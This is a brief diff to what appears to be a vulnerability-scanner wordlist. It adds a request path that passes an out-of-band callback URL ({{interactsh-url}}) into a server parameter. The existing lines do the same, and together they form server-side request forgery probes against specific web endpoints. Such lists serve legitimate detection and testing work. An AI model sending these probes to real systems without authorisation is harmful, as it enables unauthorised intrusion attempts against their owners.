@@ -1,2 +1,3 @@
 /rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
 /AdminTools/querybuilder/logon?framework=
+/console/chartServer?output=image&data=https://{{interactsh-url}}/
